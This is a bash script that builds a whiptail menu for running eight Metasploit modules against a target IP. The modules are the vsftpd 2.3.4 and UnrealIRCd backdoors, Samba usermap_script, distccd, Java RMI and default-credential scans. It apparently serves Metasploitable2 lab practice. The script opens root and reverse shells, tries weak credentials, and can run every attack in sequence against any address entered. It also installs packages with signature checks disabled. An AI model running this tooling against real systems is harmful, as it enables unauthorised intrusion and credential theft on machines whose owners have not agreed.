#!/bin/bash
# ============================================================
# Metasploit Attack Menu — TUI
# Description : Whiptail menu for launching known Metasploitable2
#               exploit modules through the native msfconsole
#               already installed on the attacker machine (e.g.
#               Kali ships with Metasploit Framework built in).
#               No Docker required on the attacker side.
# Usage       : sudo bash setup_attacker.sh
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Minimal monochrome whiptail theme — active/focused widgets get an
# inverted white highlight so it's clear what's currently selected
export NEWT_COLORS='
root=white,black
border=white,black
window=white,black
shadow=,black
title=white,black
button=black,cyan
actbutton=black,white
checkbox=white,black
actcheckbox=black,white
entry=black,white
label=white,black
listbox=white,black
actlistbox=black,white
textbox=white,black
acttextbox=black,white
helpline=white,black
roottext=white,black
'

echo -e "${CYAN}"
cat <<'EOF'
┌─────────────────────────────────┐
│   METASPLOIT ATTACK CONSOLE     │
└─────────────────────────────────┘
EOF
echo -e "${NC}"

# ============================================================
# STEP 0: Ensure msfconsole is present (not auto-installed — it's
#         a large framework; Kali ships it by default)
# ============================================================
if ! command -v msfconsole &> /dev/null; then
  echo -e "${RED}[ERROR] msfconsole not found on this machine.${NC}"
  echo -e "${YELLOW}[HINT] Install Metasploit Framework first, e.g.:${NC}"
  echo -e "  sudo apt update && sudo apt install -y metasploit-framework"
  exit 1
fi

# ============================================================
# STEP 1: Ensure whiptail is present (powers the TUI menu) —
#         the only dependency this script installs itself
# ============================================================
if ! command -v whiptail &> /dev/null; then
  echo -e "${YELLOW}[INFO] whiptail not found. Installing...${NC}"
  if ! apt update -qq 2>/dev/null; then
    if grep -qi '^ID=kali' /etc/os-release 2>/dev/null; then
      echo -e "${YELLOW}[INFO] Package index unsigned — repairing kali-archive-keyring...${NC}"
      apt-get update -qq --allow-unauthenticated
      apt-get install -y --allow-unauthenticated --reinstall kali-archive-keyring
    fi
  fi
  if ! (apt update -qq && apt install -y whiptail); then
    echo -e "${RED}[ERROR] whiptail installation failed. Aborting.${NC}"
    exit 1
  fi
  echo -e "${GREEN}[OK] whiptail installed.${NC}"
fi

# ============================================================
# STEP 2: Ask for target IP
# ============================================================
TARGET_IP=$(whiptail --title "Metasploit Attack Console" \
  --inputbox "Enter target IP (Metasploitable2 host IP):" 10 60 "10.70.8.200" \
  3>&1 1>&2 2>&3)
if [ $? -ne 0 ] || [ -z "$TARGET_IP" ]; then
  echo -e "${RED}[ERROR] No target IP provided. Aborting.${NC}"
  exit 1
fi

LHOST=$(hostname -I | awk '{print $1}')
ATTACK_LOG=()
ATTACK_TIMEOUT=60   # seconds — a hung exploit (e.g. waiting on a reverse shell) gets killed and moves on

# ============================================================
# Attack catalog — one entry per known Metasploitable2 module.
# Indexed 1-8 so both the single-attack path and "Run ALL" can
# share the same lookup and execution logic.
# ============================================================
declare -A MODULE LABEL PORT_INFO DESC EXPECTED EXTRA_SET

MODULE[1]="exploit/unix/ftp/vsftpd_234_backdoor"
LABEL[1]="FTP Backdoor (vsftpd 2.3.4)"
PORT_INFO[1]="21/tcp (FTP)"
DESC[1]="The vsftpd 2.3.4 source tarball was trojaned in 2011: sending \":)\" as part of the FTP username opens a root shell listener on port 6200."
EXPECTED[1]="Root shell via reverse connection, if the backdoor is present and reachable."
EXTRA_SET[1]=""

MODULE[2]="exploit/multi/samba/usermap_script"
LABEL[2]="Samba usermap_script"
PORT_INFO[2]="139/445/tcp (Samba)"
DESC[2]="Samba 3.0.20's 'username map script' config option lets shell metacharacters in the login username reach a shell call, giving remote code execution."
EXPECTED[2]="Root shell via reverse connection."
EXTRA_SET[2]=""

MODULE[3]="exploit/unix/irc/unreal_ircd_3281_backdoor"
LABEL[3]="UnrealIRCd Backdoor"
PORT_INFO[3]="6667/tcp (UnrealIRCd)"
DESC[3]="The Unreal3.2.8.1 source tarball was trojaned in 2009: any message prefixed with 'AB;' sent to the IRC daemon is executed as a shell command."
EXPECTED[3]="Shell as the IRC daemon's user."
EXTRA_SET[3]=""

MODULE[4]="exploit/unix/misc/distcc_exec"
LABEL[4]="distccd Command Execution"
PORT_INFO[4]="3632/tcp (distccd)"
DESC[4]="distcc's distributed-compile daemon executes any command sent to it with no authentication when bound in its default/insecure mode."
EXPECTED[4]="Shell as the low-privilege distcc user."
EXTRA_SET[4]=""

MODULE[5]="exploit/multi/misc/java_rmi_server"
LABEL[5]="Java RMI Server"
PORT_INFO[5]="1099/tcp (Java RMI)"
DESC[5]="An unauthenticated Java RMI registry lets an attacker register a remote object that loads attacker-supplied Java classes, executing arbitrary code."
EXPECTED[5]="Shell as the service's running user."
EXTRA_SET[5]=""

MODULE[6]="auxiliary/scanner/http/tomcat_mgr_login"
LABEL[6]="Tomcat Manager login scan"
PORT_INFO[6]="8180/tcp (Tomcat Manager)"
DESC[6]="Brute-forces the Tomcat /manager/html login with common default credentials. Valid creds can then be used with tomcat_mgr_deploy to upload a WAR and get code execution (not automated here)."
EXPECTED[6]="Valid manager credentials printed, if weak/default creds are set."
EXTRA_SET[6]="set RPORT 8180"

MODULE[7]="auxiliary/scanner/postgres/postgres_login"
LABEL[7]="PostgreSQL weak credentials"
PORT_INFO[7]="5432/tcp (PostgreSQL)"
DESC[7]="Scans for default/weak PostgreSQL credentials (Metasploitable2 ships postgres/postgres)."
EXPECTED[7]="Valid database credentials printed, if weak creds are set."
EXTRA_SET[7]=""

MODULE[8]="auxiliary/scanner/mysql/mysql_login"
LABEL[8]="MySQL no root password"
PORT_INFO[8]="3306/tcp (MySQL)"
DESC[8]="Metasploitable2's MySQL root account has an empty password, so any client can authenticate as root without credentials."
EXPECTED[8]="Confirms unauthenticated root login to MySQL."
EXTRA_SET[8]="set USERNAME root"

# ============================================================
# run_attack <index> — builds the msfconsole command for module
# <index>, runs it, captures the outcome, and logs it.
# ============================================================
run_attack() {
  local idx="$1"
  local mod="${MODULE[$idx]}"
  local label="${LABEL[$idx]}"
  local extra="${EXTRA_SET[$idx]}"

  local msf_cmd="use $mod; set RHOSTS $TARGET_IP"
  if [ -n "$extra" ]; then
    msf_cmd="$msf_cmd; $extra"
  fi
  msf_cmd="$msf_cmd; run; sessions -l; exit -y"

  local full_cmd="setg LHOST $LHOST; setg RHOSTS $TARGET_IP; $msf_cmd"

  echo -e "\n${CYAN}[INFO] Running: $label (max ${ATTACK_TIMEOUT}s)${NC}"
  echo -e "${CYAN}[INFO] Attacker IP (LHOST): ${LHOST}   Target IP (RHOSTS): ${TARGET_IP}${NC}"

  local ts
  ts=$(date '+%Y-%m-%d %H:%M:%S')

  local run_output
  run_output=$(timeout "$ATTACK_TIMEOUT" msfconsole -q -x "$full_cmd" | tee /dev/tty)
  local exit_code=${PIPESTATUS[0]}

  local status
  if [ "$exit_code" -eq 124 ]; then
    status="Timed out after ${ATTACK_TIMEOUT}s (no result)"
  elif echo "$run_output" | grep -qiE "session [0-9]+ opened"; then
    status="Session opened"
  elif echo "$run_output" | grep -qi "login successful"; then
    status="Valid credentials found"
  elif echo "$run_output" | grep -qiE "unreachable|connection refused|timed out"; then
    status="Failed - target unreachable"
  elif echo "$run_output" | grep -qi "no session was created"; then
    status="Completed - no session created"
  else
    status="Completed - see output above"
  fi

  ATTACK_LOG+=("$ts | $label | $TARGET_IP | $status")
}

# ============================================================
# STEP 3: Attack menu loop — pick a module, show detail, run,
#         then auto-return here (no more getting stuck at msf6 >)
# ============================================================
while true; do
  CHOICE=$(whiptail --title "Target: $TARGET_IP" \
    --menu "Choose an attack scenario:" 23 78 11 \
    "1" "FTP Backdoor - vsftpd 2.3.4 (port 21)" \
    "2" "Samba usermap_script (port 445)" \
    "3" "UnrealIRCd Backdoor (port 6667)" \
    "4" "distccd Command Execution (port 3632)" \
    "5" "Java RMI Server (port 1099)" \
    "6" "Tomcat Manager login scan (port 8180)" \
    "7" "PostgreSQL weak credentials (port 5432)" \
    "8" "MySQL no root password (port 3306)" \
    "9" "Open msfconsole (manual / free-form)" \
    "10" "Run ALL scenarios (1-8) sequentially" \
    3>&1 1>&2 2>&3)

  if [ $? -ne 0 ] || [ -z "$CHOICE" ]; then
    echo -e "${YELLOW}[INFO] Exiting attack menu.${NC}"
    break
  fi

  case "$CHOICE" in
    1|2|3|4|5|6|7|8)
      whiptail --title "Attack Detail" --yes-button "Run" --no-button "Back" \
        --yesno "Module : ${MODULE[$CHOICE]}\nPort   : ${PORT_INFO[$CHOICE]}\n\n${DESC[$CHOICE]}\n\nExpected: ${EXPECTED[$CHOICE]}" 18 76
      if [ $? -ne 0 ]; then
        continue
      fi
      run_attack "$CHOICE"
      ;;
    9)
      whiptail --title "Attack Detail" --msgbox "Drops into a normal msfconsole session with LHOST/RHOSTS pre-set. Use any module manually.\n\nFull manual control — you exit whenever you like." 12 76
      TS=$(date '+%Y-%m-%d %H:%M:%S')
      msfconsole -q -x "setg LHOST $LHOST; setg RHOSTS $TARGET_IP"
      ATTACK_LOG+=("$TS | Manual msfconsole session | $TARGET_IP | Manual session (user-driven)")
      ;;
    10)
      SUMMARY_LIST=""
      for i in 1 2 3 4 5 6 7 8; do
        SUMMARY_LIST="$SUMMARY_LIST$i. ${LABEL[$i]} (${PORT_INFO[$i]})\n"
      done
      whiptail --title "Run ALL Scenarios" --yes-button "Run All" --no-button "Back" \
        --yesno "This will run all 8 modules below against $TARGET_IP, one after another:\n\n$SUMMARY_LIST" 21 76
      if [ $? -ne 0 ]; then
        continue
      fi
      for i in 1 2 3 4 5 6 7 8; do
        run_attack "$i"
      done
      ;;
  esac

  if ! whiptail --title "Metasploit Attack Console" --yesno "Run another module against $TARGET_IP?" 8 60; then
    break
  fi
done

echo -e "\n${CYAN}================ Attack Summary ================${NC}"
if [ ${#ATTACK_LOG[@]} -eq 0 ]; then
  echo "  No attacks were run this session."
else
  for entry in "${ATTACK_LOG[@]}"; do
    echo "  $entry"
  done
fi
echo -e "${CYAN}==================================================${NC}"
echo -e "\n${GREEN}Session ended.${NC}"
